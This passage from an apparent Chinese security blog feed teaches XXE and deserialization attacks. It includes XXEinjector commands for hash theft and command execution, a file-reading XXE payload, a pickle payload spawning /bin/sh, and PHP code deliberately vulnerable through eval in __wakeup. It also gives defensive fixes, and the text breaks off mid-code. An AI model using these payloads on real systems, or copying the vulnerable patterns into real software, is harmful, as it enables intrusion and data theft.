--host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt</span><br></pre></td></tr></table></figure><p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc</span><br></pre></td></tr></table></figure><p>通过直接性漏洞利用方式进行资源枚举：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK</span><br></pre></td></tr></table></figure><p>枚举未过滤的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all</span><br></pre></td></tr></table></figure><p>窃取Windows哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes</span><br></pre></td></tr></table></figure><p>使用Java jar上传文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf</span><br></pre></td></tr></table></figure><p>使用PHP expect执行系统指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls</span><br></pre></td></tr></table></figure><p>测试XSLT注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt</span><br></pre></td></tr></table></figure><p>记录请求信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt</span><br></pre></td></tr></table></figure><h2 id="XXE-漏洞修复与防御方案"><a href="#XXE-漏洞修复与防御方案" class="headerlink" title="XXE 漏洞修复与防御方案"></a>XXE 漏洞修复与防御方案</h2><ol><li><p>推荐使用开发语言提供的<strong>禁用外部实体</strong>的方法。</p><p>PHP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>python：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p>过滤用户提交的 XML 数据</p><p>过滤关键词：<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、SYSTEM、PUBLIC</p></li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>xxe-lab</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163807711.png" alt="image-20220811163807711"></p><p>登陆界面，输入用户名密码，抓包</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163854896.png" alt="image-20220811163854896"></p><p>发现输入的数据使用post请求发送，且格式类似XML。</p><p>构造payload，执行文件读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;test;&lt;/username&gt;   &lt;!-- 实体引用 --&gt;</span><br><span class="line">&lt;password&gt;Mikasa&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811164116973.png" alt="image-20220811164116973"></p><p>成功获取到Windows配置信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/08DlKYbVXPt</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://frankcao3.github.io/posts/58219"/>
    <id>https://frankcao3.github.io/posts/58219</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>参考：<a href="https://www.anquanke.com/post/id/224769">https://www.anquanke.com/post/id/224769</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p><strong>序列化</strong> ：</p><p>概念：将对象转换成字节序列（json&#x2F;xml文件）。</p><p>作用：在传递和保存对象时，序列化可以保证对象的完整性和可传递性。对象被转换为有序字节序列，以便在网络上传输或者保存在本地文件中。</p></li><li><p><strong>反序列化</strong>：</p><p>概念：将字节序列（json&#x2F;xml文件）转换成对象。</p><p>作用：根据字节序列中保存的对象状态及描述信息，通过反序列化重建对象。</p></li></ul><h2 id="序列化的优点"><a href="#序列化的优点" class="headerlink" title="序列化的优点"></a>序列化的优点</h2><p>将对象转为字节流存储到硬盘上，当 JVM （java虚拟机）停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）。</p><p>序列化为字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。</p><p>通过序列化可以在进程间传递对象。</p><h2 id="序列化的实现"><a href="#序列化的实现" class="headerlink" title="序列化的实现"></a>序列化的实现</h2><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>Java中，只有实现了 <strong>Serializable</strong> 或者 <strong>Externalizable</strong> 接口的类的对象才能被序列化为字节序列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">java.io.ObjectOutputStream：对象输出流。</span><br><span class="line">该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">java.io.ObjectInputStream：对象输入流。</span><br><span class="line">该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  <span class="comment">// 将序列化的输出定向到fos</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;lihao&quot;</span>, <span class="string">&quot;wjwlh&quot;</span>, <span class="string">&quot;21&quot;</span>);</span><br><span class="line">            oos.writeObject(student1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.out&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">            <span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> (Student) ois.readObject();</span><br><span class="line">            System.out.println(student2.getUserName()+ <span class="string">&quot; &quot;</span> +</span><br><span class="line">                    student2.getPassword() + <span class="string">&quot; &quot;</span> + student2.getYear());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外java还有其他序列化实现方式，比如 <strong>json</strong>、&#x3D;&#x3D;<strong>fastjson</strong>&#x3D;&#x3D;、<strong>ProtoBuff</strong>、<strong>Hessian</strong>、<strong>Kyro</strong>等。</p><p>参考：<a href="https://blog.csdn.net/m0_46201444/article/details/115081351%E3%80%82">https://blog.csdn.net/m0_46201444/article/details/115081351。</a></p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>php中，序列化和反序列化对应的函数分别为 <strong>serialize()</strong> 和 **unserialize()**。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span>=<span class="keyword">array</span>(<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Like&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>));    <span class="comment">// 对数组进行序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;xiaocui&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$M</span> = <span class="title function_ invoke__">newman</span>();  <span class="comment">//创建一个对象</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$M</span>));        <span class="comment">// 对对象进行序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>数组的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;a:3:&#123;i:0;s:1:&quot;I&quot;;i:1;s:4:&quot;Like&quot;;i:2;s:3:&quot;PHP&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">a:3 a代表一数组，3代表数组中有3个元素</span><br><span class="line">i:0 代表元素的下标值为0</span><br><span class="line">s:1 代表元素的数据类型为字符型,长度为1</span><br></pre></td></tr></table></figure><p><strong>对象的序列化</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;xiaocui&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:8:&quot;manage&quot;;i:26;&#125;&quot;</span><br><span class="line"></span><br><span class="line">O:3 代表是一个对象，其类名的长度为3</span><br><span class="line">3 代表类中的字段数</span><br><span class="line">s:4 代表属性的类型为字符型，长度为4</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><p>数组的序列化和反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $stu=[&#x27;tom&#x27;, &#x27;berry&#x27;, &#x27;ketty&#x27;];</span><br><span class="line">    $str=serialize($stu); // 序列化</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122702017.png" alt="image-20220805122702017" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 数组的反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    print_r($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122807404.png" alt="image-20220805122807404"></p><p>对象的序列化和反序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Student &#123;</span><br><span class="line">        public $name;</span><br><span class="line">        protected $sex;</span><br><span class="line">        private $add;</span><br><span class="line">        public function __construct($name, $sex, $add)&#123;</span><br><span class="line">            $this-&gt;name=$name;</span><br><span class="line">            $this-&gt;sex=$sex;</span><br><span class="line">            $this-&gt;add=$add;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 测试</span><br><span class="line">    $stu=new Student(&#x27;tom&#x27;, &#x27;男&#x27;, &#x27;北京&#x27;);</span><br><span class="line">    // 序列化</span><br><span class="line">    $str=serialize($stu);</span><br><span class="line">    file_put_contents(&#x27;./stu.txt&#x27;, $str);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805122910666.png" alt="image-20220805122910666" style="zoom:55%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 反序列化</span><br><span class="line">    $str=file_get_contents(&#x27;./stu.txt&#x27;);</span><br><span class="line">    $stu=unserialize($str);</span><br><span class="line">    var_dump($stu);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805123011403.png" alt="image-20220805123011403"></p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p><p><code>pickle</code>有如下四种操作方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dump对象序列化到文件对象并存入文件</span><br><span class="line">dumps对象序列化为 bytes 对象</span><br><span class="line">load对象反序列化并从文件中读取数据</span><br><span class="line">loads从 bytes 对象反序列化</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self, name=<span class="string">&#x27;h3rmesk1t&#x27;</span></span>):</span><br><span class="line">self.name = name</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span class="comment"># 序列化输出为b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</span><br><span class="line"><span class="comment"># 反序列化输出为 h3rmesk1t</span></span><br></pre></td></tr></table></figure><p><strong>python反序列化漏洞原理：</strong></p><p>python反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。类似于PHP中的<code>__wakeup()</code>方法。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))   <span class="comment"># 反序列化创建对象时调用__reduce__，执行恶意代码</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>序列化或反序列化的过程中会<strong>自动调用</strong>一些魔术方法。</p><p><strong>php 中 magic函数命名是以符号“__”开头的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__construct：当一个对象创建时调用（constructor）</span><br><span class="line"></span><br><span class="line">__destruct：当一个对象被销毁时调用（destructor）</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()：当把一个类当作函数使用时自动调用</span><br><span class="line"></span><br><span class="line">__toString：当一个对象被当作一个字符串处理时自动调用</span><br><span class="line"></span><br><span class="line">__sleep：在使用<span class="title function_ invoke__">serialize</span>()函数时，程序会检查类中是否存在一个<span class="title function_ invoke__">__sleep</span>()魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</span><br><span class="line"></span><br><span class="line">__wakeup：在使用<span class="title function_ invoke__">unserialize</span>()时，会检查是否存在一个<span class="title function_ invoke__">__wakeup</span>()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()：在对象中调用一个不存在或者不可访问方法时，__call会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()：给不可访问属性赋值时，__set会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时，<span class="title function_ invoke__">__isset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：对不可访问属性调用<span class="keyword">unset</span>()时，<span class="title function_ invoke__">__unset</span>()会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()：读取不可访问属性的值时，__get会被调用。</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p><p>PHP反序列化漏洞的形成的根本原因是<strong>程序没有对用户输入的序列化字符串进行检测，导致反序列化过程可以被恶意控制（执行魔术方法），进而造成代码执行（XSS等）、getshell等一系列不可控的后果</strong>。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些<strong>自定义数据</strong>，进而在反序列化的时候能够使用 readObject 进行读取。如果用户自定义了一些恶意数据在序列化字符串中，在反序列化为对象时，其中的变量被用于命令执行等操作，就会造成反序列化漏洞。</p><p><strong>注意</strong>：<em>反序列化对象时，不会调用对象的构造函数，因为是反序列化得来的。但是在程序结束时会调用对象的析构函数。</em></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>反序列化函数中的<strong>参数可控</strong>（Java反序列化等）</li><li>存在可利用的类，且类中有<strong>魔术方法</strong>（php、python反序列化等）</li></ol><p>例如，有如下PHP实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$id</span> = <span class="string">&#x27;Baize&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;id);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以确定可控参数是GET型string参数，并且后端接收参数后会进行反序列化操作。同时，test类中存在__wakeup魔术方法，操作是eval($id)。</p><p>那么我们思路是：构造test类的序列化字符串，使得反序列化后的$id值为要执行的操作（代码执行漏洞），例如我们要执行phpinfo()，那么可以构造这样一个字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:2:&quot;id&quot;;s:10:&quot;phpinfo();&quot;&#125;</span><br></pre></td></tr></table></figure><p>这样反序列化会时就会自动调用<code>__wakeup</code>魔术方法，即执行<code>eval(phpinfo();)</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813131438447.png" alt="image-20220813131438447"></p><h3 id="POP链构造（php）"><a href="#POP链构造（php）" class="headerlink" title="POP链构造（php）"></a>POP链构造（php）</h3><p>其实实际中基本不会有上述实例这种这么简单的利用过程，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。关注整个函数的调用过程中参数的传递情况，找到可利用的点。</p><p>**POP CHAIN(POP链)**：</p><p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p><p><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></p><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>test.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;   <span class="comment"># 如果$obj变量存在则返回调用$obj对象中的Delete()函数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  <span class="comment"># 存在任意文件删除的漏洞</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;     <span class="comment"># 如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</span></span><br><span class="line"><span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span 